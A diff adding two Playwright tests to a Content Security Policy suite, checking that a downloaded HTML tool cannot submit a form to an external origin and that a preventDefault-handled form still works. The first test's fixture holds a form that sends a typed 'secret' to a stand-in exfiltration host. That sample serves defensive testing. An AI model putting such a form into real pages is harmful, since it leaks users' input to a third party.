@@ -112,6 +112,39 @@ test.describe('a downloaded tool cannot reach the network', () => {
     await settle(violations, 1);
     expect(violations.map((v) => v.directive)).toContain('script-src');
   });
+
+  test('TC-CSP13: a form cannot submit to an external origin @csp @safety', async ({
+    page,
+    openPublished,
+    violations,
+    reached,
+  }) => {
+    // The one channel the original policy left open in a downloaded copy. CSP
+    // cannot stop navigation, but it can stop a *form* navigating: form-action
+    // is consulted before the submission navigates. Without it, everything the
+    // user typed leaves in the query string.
+    await openPublished(`<!doctype html>
+      <html lang="en">
+        <head><title>Fixture tool</title></head>
+        <body>
+          <form method="GET" action="${EXFIL_ORIGIN}/collect">
+            <input name="secret" value="user-typed-this" />
+            <button type="submit">Send</button>
+          </form>
+        </body>
+      </html>`);
+
+    // noWaitAfter: Chromium schedules the navigation, CSP then refuses it, and
+    // the scheduled-navigation wait never resolves. Waiting for it would be
+    // waiting for the thing under test not to happen.
+    await page.getByRole('button', { name: 'Send' }).click({ noWaitAfter: true });
+
+    await settle(violations, 1);
+    expect(violations.map((v) => v.directive)).toContain('form-action');
+    expect(reached).toEqual([]);
+    // Still on the tool, not on the attacker's page.
+    expect(page.url().startsWith('file://')).toBe(true);
+  });
 });
 
 test.describe('a downloaded tool still works', () => {
@@ -162,6 +195,38 @@ test.describe('a downloaded tool still works', () => {
     ]);
 
     expect(download.suggestedFilename()).toBe('result.txt');
+  });
+
+  test('TC-CSP14: a form handled with preventDefault still works @csp', async ({
+    page,
+    openPublished,
+    violations,
+  }) => {
+    // The other half of TC-CSP13, and the reason form-action is the right tool
+    // rather than withholding allow-forms: the directive is checked at
+    // navigation time, so the `submit` event is still dispatched and an
+    // ordinary handler runs untouched. If this ever fails, form-action has
+    // started blocking earlier than measured and every form-driven tool is dead.
+    await openPublished(`<!doctype html>
+      <html lang="en">
+        <head><title>Fixture tool</title></head>
+        <body>
+          <p id="log">idle</p>
+          <form id="f"><input id="i" aria-label="Command" /><button type="submit">Go</button></form>
+          <script>
+            document.getElementById('f').addEventListener('submit', (e) => {
+              e.preventDefault();
+              document.getElementById('log').textContent = 'handled: ' + document.getElementById('i').value;
+            });
+          </script>
+        </body>
+      </html>`);
+
+    await page.getByLabel('Command').fill('north');
+    await page.getByRole('button', { name: 'Go' }).click();
+
+    await expect(page.getByText('handled: north')).toBeVisible();
+    expect(violations).toEqual([]);
   });
 
   test('TC-CSP09: localStorage persists across a reload @csp', async ({ page, openPublished }) => {
